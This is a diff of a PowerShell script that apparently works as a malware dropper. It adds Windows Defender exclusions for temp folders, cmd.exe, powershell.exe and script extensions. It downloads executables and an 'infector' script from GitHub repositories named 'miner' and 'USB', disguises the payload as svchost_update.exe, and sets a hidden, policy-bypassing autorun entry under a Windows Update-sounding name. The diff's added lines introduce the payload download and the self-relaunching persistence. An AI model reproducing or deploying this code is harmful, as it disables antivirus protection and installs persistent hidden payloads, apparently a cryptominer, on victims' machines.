@@ -1,14 +1,13 @@
-# PowerShell script to add Windows Defender exclusions and set up defendnot-loader.exe
-
 Start-Sleep -Seconds 15
 
 $monitorScriptPath = "C:\Windows\Temp\monitor.ps1"
 $infectorUrl = "https://github.com/NaomiMendoza127/USB/raw/refs/heads/main/infector.ps1"
-$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/defendnot-loader.exe"
-$crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/SystemCore_x64.zip"
-$crackedSoftwareZipPath = "C:\Windows\Temp\update_package_x64.zip"
-$crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices_x64"
-$payloadPath = "$crackedSoftwareFolder\defendnot-loader.exe"
+$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/R_Final.exe"
+$payloadPath = "C:\Windows\Temp\svchost_update.exe"
+$crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/SystemCore.zip"
+$crackedSoftwareZipPath = "C:\Windows\Temp\update_package.zip"
+$crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices"
+$crackedSoftwareExe = "$crackedSoftwareFolder\SystemCore\ServiceHost.exe"
 
 function Is-Admin {
     $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -32,8 +31,9 @@ for ($i = 0; $i -lt $maxAttempts; $i++) {
 
 $exclusionsPaths = @(
     "C:\Users\Public\SystemLib",
-    "$crackedSoftwareFolder",
-    "$crackedSoftwareZipPath",
+    "C:\Windows\Temp\svchost_update.exe",
+    "C:\Windows\Temp\WindowsServices",
+    "C:\Windows\Temp\update_package.zip",
     "C:\ProgramData\WinKit",
     "C:\Windows\Temp\*",
     "C:\ProgramData\Microsoft\Windows\Temp",
@@ -48,7 +48,7 @@ $exclusionsPaths = @(
     $monitorScriptPath
 )
 $exclusionsProcesses = @(
-    "defendnot-loader.exe",
+    "svchost_update.exe",
     "ServiceHost.exe",
     "cmd.exe",
     "powershell.exe"
@@ -56,8 +56,8 @@ $exclusionsProcesses = @(
 $exclusionsExtensions = @(
     "exe",
     "dll",
-    "bin",
-    "pdb",
+    "bat",
+    "cmd",
     "ps1",
     "vbs",
     "js",
@@ -120,6 +120,21 @@ if (-not (Test-Path -Path $monitorScriptPath)) {
     }
 }
 
+if (-not (Test-Path -Path $payloadPath)) {
+    for ($i = 0; $i -lt $retryCount; $i++) {
+        try {
+            Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
+            if (-not (Test-Path -Path $payloadPath)) {
+                throw "Downloaded file not found at $payloadPath."
+            }
+            Unblock-File -Path $payloadPath -ErrorAction Stop
+            break
+        } catch {
+            Start-Sleep -Seconds 2
+        }
+    }
+}
+
 if (-not (Test-Path -Path $crackedSoftwareFolder)) {
     for ($i = 0; $i -lt $retryCount; $i++) {
         try {
@@ -128,8 +143,8 @@ if (-not (Test-Path -Path $crackedSoftwareFolder)) {
                 throw "Downloaded zip file not found at $crackedSoftwareZipPath."
             }
             Expand-Archive -Path $crackedSoftwareZipPath -DestinationPath $crackedSoftwareFolder -Force -ErrorAction Stop
-            if (-not (Test-Path -Path $payloadPath)) {
-                throw "Payload executable missing."
+            if (-not (Test-Path -Path $crackedSoftwareExe)) {
+                throw "Update executable missing."
             }
             Unblock-File -Path "$crackedSoftwareFolder\*" -ErrorAction Stop
             break
@@ -150,10 +165,11 @@ if (Test-Path -Path $payloadPath) {
 
 try {
     $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-    $regName = "WindowsDefenderUpdate"
-    $command = "$crackedSoftwareFolder\defendnot-loader.exe"
+    $regName = "WindowsUpdateCheck"
+    $scriptPath = $PSCommandPath
+    $command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
     $regExists = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
-    if ($regExists -and $regExists.WindowsDefenderUpdate -eq $command) {
+    if ($regExists -and $regExists.WindowsUpdateCheck -eq $command) {
     } else {
         if (-not (Test-Path $regPath)) {
             New-Item -Path $regPath -Force | Out-Null
@@ -199,5 +215,3 @@ try {
     }
 } catch {
 }
-
-Write-Host "Setup completed successfully."
